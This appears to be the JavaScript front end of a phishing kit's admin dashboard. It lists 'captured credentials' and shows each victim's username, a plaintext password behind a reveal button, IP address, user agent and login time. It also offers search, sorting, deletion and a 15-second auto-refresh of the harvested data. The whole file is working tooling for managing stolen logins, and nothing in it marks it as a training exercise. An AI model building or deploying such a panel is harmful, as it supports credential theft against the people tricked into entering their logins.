document.addEventListener('DOMContentLoaded', () => {
  // DOM Elements
  const sidebar = document.getElementById('sidebar');
  const menuToggle = document.getElementById('menuToggle');
  const refreshBtn = document.getElementById('refreshBtn');
  const searchInput = document.getElementById('searchInput');
  const sortSelect = document.getElementById('sortSelect');
  const deleteAllBtn = document.getElementById('deleteAllBtn');
  const deleteModal = document.getElementById('deleteModal');
  const modalCancel = document.getElementById('modalCancel');
  const modalConfirm = document.getElementById('modalConfirm');
  const modalTitle = document.getElementById('modalTitle');
  const modalMessage = document.getElementById('modalMessage');
  const toast = document.getElementById('toast');
  const toastMessage = document.getElementById('toastMessage');
  const pageTitle = document.getElementById('pageTitle');
  const pageSubtitle = document.getElementById('pageSubtitle');

  let pendingDeleteId = null;
  let pendingDeleteAll = false;
  let debounceTimer = null;

  // ====== Sidebar Navigation ======
  document.querySelectorAll('.nav-item[data-section]').forEach(item => {
    item.addEventListener('click', (e) => {
      e.preventDefault();
      const section = item.dataset.section;

      document.querySelectorAll('.nav-item[data-section]').forEach(n => n.classList.remove('active'));
      item.classList.add('active');

      document.querySelectorAll('.section').forEach(s => s.classList.add('hidden'));
      document.getElementById(`section-${section}`).classList.remove('hidden');

      const titles = {
        dashboard: ['Dashboard', 'Overview of captured credentials'],
        credentials: ['Credentials', 'Manage all captured login data'],
        activity: ['Activity Log', 'Timeline of login attempts']
      };
      pageTitle.textContent = titles[section][0];
      pageSubtitle.textContent = titles[section][1];

      if (window.innerWidth <= 768) sidebar.classList.remove('open');
    });
  });

  // Mobile menu toggle
  menuToggle.addEventListener('click', () => sidebar.classList.toggle('open'));

  // ====== Data Fetching ======
  async function fetchStats() {
    try {
      const res = await fetch('/api/stats');
      const data = await res.json();
      document.getElementById('totalSubmissions').textContent = data.totalSubmissions;
      document.getElementById('todaySubmissions').textContent = data.todaySubmissions;
      document.getElementById('uniqueUsers').textContent = data.uniqueUsernames;
      document.getElementById('lastSubmission').textContent = data.latestSubmission
        ? timeAgo(new Date(data.latestSubmission)) : 'Never';
      document.getElementById('recordCount').textContent = `${data.totalSubmissions} records`;
    } catch (err) {
      console.error('Failed to fetch stats:', err);
    }
  }

  async function fetchCredentials(search = '', sort = 'newest') {
    try {
      const params = new URLSearchParams();
      if (search) params.set('search', search);
      if (sort) params.set('sort', sort);
      const res = await fetch(`/api/credentials?${params}`);
      const data = await res.json();
      renderRecentTable(data.slice(0, 5));
      renderCredentialsTable(data);
      renderActivityFeed(data);
    } catch (err) {
      console.error('Failed to fetch credentials:', err);
    }
  }

  // ====== Table Rendering ======
  function renderRecentTable(credentials) {
    const tbody = document.getElementById('recentTableBody');
    if (!credentials.length) {
      tbody.innerHTML = '<tr class="empty-row"><td colspan="5">No credentials captured yet</td></tr>';
      return;
    }
    tbody.innerHTML = credentials.map((c, i) => `
      <tr>
        <td>${i + 1}</td>
        <td>${escapeHtml(c.username)}</td>
        <td><span class="password-text">••••••••</span></td>
        <td>${c.ipAddress || 'N/A'}</td>
        <td>${formatDate(c.timestamp)}</td>
      </tr>
    `).join('');
  }

  function renderCredentialsTable(credentials) {
    const tbody = document.getElementById('credentialsTableBody');
    if (!credentials.length) {
      tbody.innerHTML = '<tr class="empty-row"><td colspan="7">No credentials captured yet</td></tr>';
      return;
    }
    tbody.innerHTML = credentials.map((c, i) => `
      <tr data-id="${c._id}">
        <td>${i + 1}</td>
        <td>${escapeHtml(c.username)}</td>
        <td>
          <div class="password-cell">
            <span class="password-text" data-hidden="true" data-pw="${escapeHtml(c.password)}">••••••••</span>
            <button class="btn-reveal" onclick="togglePassword(this)" title="Toggle password">
              <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
            </button>
          </div>
        </td>
        <td>${c.ipAddress || 'N/A'}</td>
        <td title="${c.userAgent || ''}">${truncate(c.userAgent || 'N/A', 30)}</td>
        <td>${formatDate(c.timestamp)}</td>
        <td>
          <button class="btn-delete" onclick="confirmDelete('${c._id}')" title="Delete">
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg>
          </button>
        </td>
      </tr>
    `).join('');
  }

  function renderActivityFeed(credentials) {
    const feed = document.getElementById('activityFeed');
    if (!credentials.length) {
      feed.innerHTML = `<div class="empty-state">
        <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" opacity="0.3"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>
        <p>No activity recorded yet</p></div>`;
      return;
    }
    feed.innerHTML = credentials.map(c => `
      <div class="activity-item">
        <div class="activity-dot"></div>
        <div class="activity-content">
          <div class="activity-text">Login attempt by <strong>${escapeHtml(c.username)}</strong></div>
          <div class="activity-time">${formatDate(c.timestamp)} · ${c.ipAddress || 'Unknown IP'}</div>
        </div>
      </div>
    `).join('');
  }

  // ====== Helpers ======
  function escapeHtml(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
  }

  function formatDate(dateStr) {
    const d = new Date(dateStr);
    return d.toLocaleDateString('en-IN', {
      day: '2-digit', month: 'short', year: 'numeric',
      hour: '2-digit', minute: '2-digit', hour12: true
    });
  }

  function timeAgo(date) {
    const seconds = Math.floor((new Date() - date) / 1000);
    if (seconds < 60) return 'Just now';
    if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
    if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`;
    return `${Math.floor(seconds / 86400)}d ago`;
  }

  function truncate(str, len) {
    return str.length > len ? str.substring(0, len) + '...' : str;
  }

  function showToast(message) {
    toastMessage.textContent = message;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 3000);
  }

  // ====== Global Functions ======
  window.togglePassword = function(btn) {
    const span = btn.parentElement.querySelector('.password-text');
    const hidden = span.dataset.hidden === 'true';
    span.textContent = hidden ? span.dataset.pw : '••••••••';
    span.dataset.hidden = hidden ? 'false' : 'true';
  };

  window.confirmDelete = function(id) {
    pendingDeleteId = id;
    pendingDeleteAll = false;
    modalTitle.textContent = 'Delete Credential?';
    modalMessage.textContent = 'This action cannot be undone.';
    deleteModal.classList.add('show');
  };

  // ====== Delete All ======
  deleteAllBtn.addEventListener('click', () => {
    pendingDeleteAll = true;
    pendingDeleteId = null;
    modalTitle.textContent = 'Delete All Credentials?';
    modalMessage.textContent = 'This will permanently remove all captured data.';
    deleteModal.classList.add('show');
  });

  modalCancel.addEventListener('click', () => {
    deleteModal.classList.remove('show');
    pendingDeleteId = null;
    pendingDeleteAll = false;
  });

  modalConfirm.addEventListener('click', async () => {
    deleteModal.classList.remove('show');
    try {
      if (pendingDeleteAll) {
        await fetch('/api/credentials', { method: 'DELETE' });
        showToast('All credentials deleted');
      } else if (pendingDeleteId) {
        await fetch(`/api/credentials/${pendingDeleteId}`, { method: 'DELETE' });
        showToast('Credential deleted');
      }
      pendingDeleteId = null;
      pendingDeleteAll = false;
      loadData();
    } catch (err) {
      console.error('Delete failed:', err);
    }
  });

  // ====== Search & Sort ======
  searchInput.addEventListener('input', () => {
    clearTimeout(debounceTimer);
    debounceTimer = setTimeout(() => {
      fetchCredentials(searchInput.value, sortSelect.value);
    }, 300);
  });

  sortSelect.addEventListener('change', () => {
    fetchCredentials(searchInput.value, sortSelect.value);
  });

  // ====== Refresh ======
  refreshBtn.addEventListener('click', () => {
    refreshBtn.classList.add('spinning');
    loadData();
    setTimeout(() => refreshBtn.classList.remove('spinning'), 800);
  });

  // ====== Load All Data ======
  function loadData() {
    fetchStats();
    fetchCredentials(searchInput ? searchInput.value : '', sortSelect ? sortSelect.value : 'newest');
  }

  // Initial load
  loadData();

  // Auto-refresh every 15 seconds
  setInterval(loadData, 15000);
});
